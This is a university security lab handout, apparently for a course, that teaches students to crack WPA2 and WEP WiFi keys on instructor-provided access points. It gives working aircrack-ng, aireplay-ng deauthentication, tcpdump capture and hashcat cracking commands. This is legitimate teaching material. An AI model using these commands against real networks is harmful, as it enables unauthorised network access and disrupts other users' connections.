# TPAS - Lab 05 - WiFi Security

In this assignment, we'll look at WEP and WPA2 hacking techniques.

## 1 - Tools

Please install:

- `aircrack-ng` suite, `hashcat` and [hashcat-utils](https://github.com/hashcat/hashcat-utils)

Linux (Debian/Ubuntu): `sudo apt install aircrack-ng hashcat`

OSX: `brew install aircrack-ng hashcat`

OSX (M1):

```bash
curl https://raw.githubusercontent.com/Homebrew/homebrew-core/5f0518be9014b25ac963593cb5c2d6da68cacafb/Formula/aircrack-ng.rb -O
brew install ./aircrack-ng.rb
```

Hashcat utils:

```bash
git clone https://github.com/hashcat/hashcat-utils.git
cd hashcat-utils/src
make
sudo cp cap2hccapx.bin /usr/local/bin/cap2hccapx
```

## 2 - Tasks

To obtain your points for both tasks, you need to send the captured traffic and correct passwords to the professor via [email](mailto:andre.baptista@fc.up.pt), or show these in person during class.

**Notes:**

- If you're unable to complete these tasks today, I'll try to have the APs available in January.
- If you are unable to enable monitor mode, I have two WiFi adapters that you can use (follow instructions at the end of this guide)
- If you're using a VM, please follow the instructions at the end of this guide.

### Lab 05 - WPA2

Before we start, run the `ifconfig` command to retrieve your WiFi interface (usually `wlan0`, `wlxd`, etc).

1. Retrieve a wordlist (e.g. https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt)

#### Linux

2. Enable monitor mode on your network interface: `airmon-ng start wlan0`
3. Retrieve the target BSSID and channel with `airodump-ng mon0`
4. Capture a 4-way handshake with the command (you need to change `BSSID` and `CHANNEL`): `airodump-ng -c 1 — bssid xx:xx:xx:xx:xx:xx -w capture.cap mon0`
5. While we wait for a handshake, we can use aireplay to force clients to reconnect to the AP (deauth) with: `aireplay-ng -0 2 -a xx:xx:xx:xx:xx:xx mon0`. If you can't perform this, ask the professor to start a handshake manually.
6. Convert to hashcat format: `cap2hccapx capture.cap capture.hccapx`
7. Run hashcat: `hashcat -m 2500 capture.hccapx wordlist.txt`

You can also crack the handshake with `aircrack-ng`: `aircrack-ng -w wordlist.txt capture.cap`

#### OSX

For the `mergecap` command, `brew install wireshark` may be necessary.

2. Run the command: `ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport`
3. Retrieve the target BSSID and channel with `sudo airport -s`
4. Run the following script to capture a 4-way handshake (you need to change `BSSID` and `CHANNEL` variables):

```bash
export BSSID=xx:xx:xx:xx:xx:xx
export CHANNEL=1
sudo airport -z
sudo airport -c$CHANNEL
echo "Waiting for beacon..."
sudo tcpdump "type mgt subtype beacon and ether src $BSSID" -I -c 6 -i en0 -w beacon.cap
echo "Waiting for handshake... CTRL-C when frames > 4"
sudo tcpdump "ether proto 0x888e and ether host $BSSID" -I -U -vvv -i en0 -w handshake.cap
echo "Done"
mergecap -a -F pcap -w capture.cap beacon.cap handshake.cap
cap2hccapx capture.cap capture.hccapx
```

4. While we wait for a handshake, we can use aireplay to force clients to reconnect to the AP (deauth) with the following tool: https://github.com/0x0XDev/JamWiFi. If you can't perform this, ask the professor to start a handshake manually.
5. Run hashcat: `hashcat -m 2500 capture.hccapx wordlist.txt` 

### Lab 05 - WEP

1. Enable monitor mode on your network interface
2. Run `airodump-ng` or `Wireshark` to capture packets
3. Use `aircrack-ng` to crack the key `aircrack-ng -1 -a 1 -b xx:xx:xx:xx:xx:xx capture.cap` after retrieving enough IVs

## 3 - Special instructions

### 3.1 - TP-Link WiFi adapters

1. Install the proper driver for monitor mode support:

```bash
sudo apt -y install bc
sudo rmmod r8188eu.ko
git clone https://github.com/aircrack-ng/rtl8188eus
cd rtl8188eus
sudo echo "blacklist r8188eu" > /etc/modprobe.d/realtek.conf
make
sudo make install
sudo modprobe 8188eu
```

2. Ignore `airmon-ng` commands on this guide, and enable monitor mode with (replace `wlan0` with the interface name):

```bash
ifconfig wlan0 down
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
```

### 3.2 - Virtual Machines

1. Install [VirtualBox Extension Pack](https://download.virtualbox.org/virtualbox/6.1.30/Oracle_VM_VirtualBox_Extension_Pack-6.1.30.vbox-extpack). Go to `Preferences` > `Extensions` > `Add new package` (green button) and select the downloaded pack.
2. Before starting your VM, right-click and go to `Settings` > `Ports` > `USB` and enable `USB 2.0` or `3.0`.
3. Create a USB device filter and pick the WiFi adapter (e.g. `Realtek USB 10/100/1000 LAN`).
4. Start your VM and plug the USB adapter manually. You may need to click the `USB` icon on your running screen bottom and select the new device (e.g. `Realtek 802.11n NIC`)
5. Follow the steps on `3.1` if you're using provided TP-Link WiFi adapters.
